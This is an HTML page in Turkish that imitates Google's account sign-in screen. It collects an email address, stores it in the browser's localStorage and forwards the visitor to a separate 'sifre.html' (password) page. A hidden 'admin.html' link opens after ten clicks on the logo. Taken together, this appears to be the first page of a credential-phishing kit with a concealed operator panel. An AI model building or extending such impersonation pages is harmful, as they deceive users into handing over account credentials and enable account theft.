<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Oturum Aç</title>
<style>
body { margin: 0; font-family: "Roboto", Arial, sans-serif; background: #ffffff; }
.container { display: flex; justify-content: center; align-items: center; height: 90vh; }
.box { width: 360px; padding: 20px; }
.logo { width: 75px; display: block; margin: 0 auto 20px; cursor: pointer; }
.title { font-size: 24px; text-align: center; margin-bottom: 5px; }
.subtitle { text-align: center; font-size: 16px; color: #5f6368; margin-bottom: 30px; }
input { width: 100%; padding: 14px 10px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; outline: none; }
input:focus { border: 2px solid #1a73e8; }
.link { color: #1a73e8; font-size: 14px; text-decoration: none; display: inline-block; margin-top: 10px; }
.link:hover { text-decoration: underline; }
.info { font-size: 13px; color: #5f6368; margin-top: 20px; }
.actions { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
button { background: #1a73e8; color: white; border: none; padding: 10px 22px; border-radius: 4px; font-size: 14px; cursor: pointer; }
button:hover { background: #1669c1; }
.footer { position: absolute; bottom: 15px; left: 20px; font-size: 13px; color: #5f6368; }
</style>
</head>
<body>

<div class="container">
    <div class="box">
        <img src="logo.png" class="logo" id="logo">

        <div class="title">Oturum açın</div>
        <div class="subtitle">Google Hesabınızı kullanın</div>

        <input type="text" id="email" placeholder="E-posta veya telefon">

        <br>

        <a href="#" class="link">E-posta adresinizi mi unuttunuz?</a>

        <div class="info">
            Bu bilgisayar sizin değil mi? Gizli oturum açmak için Misafir modunu kullanın.
        </div>

        <div class="actions">
            <a href="#" class="link">Hesap oluşturun</a>
            <button onclick="nextPage()">Sonraki</button>
        </div>
    </div>
</div>

<div class="footer">Türkçe ▼</div>

<script>
let logoClick = 0;
document.getElementById("logo").addEventListener("click", () => {
    logoClick++;
    if(logoClick >= 10) {
        window.location.href = "admin.html";
    }
});

function nextPage() {
    let email = document.getElementById("email").value;
    if(email === "") {
        alert("E-posta giriniz!");
        return;
    }
    // E-postayı localStorage ile şifre sayfasına aktar
    localStorage.setItem("email", email);
    window.location.href = "sifre.html";
}
</script>

</body>
</html>
